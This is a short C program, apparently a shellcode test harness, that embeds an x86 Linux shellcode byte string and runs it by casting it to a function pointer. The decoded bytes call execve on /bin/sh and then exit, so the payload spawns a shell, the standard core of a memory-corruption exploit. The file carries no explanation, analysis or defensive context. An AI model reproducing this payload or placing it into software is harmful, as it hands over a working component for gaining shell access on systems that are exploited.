#include <stdio.h>

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80\x31\xc0\x40\xcd\x80";

int main(void)
{

(*(void(*)()) shellcode)();
return 0;
}
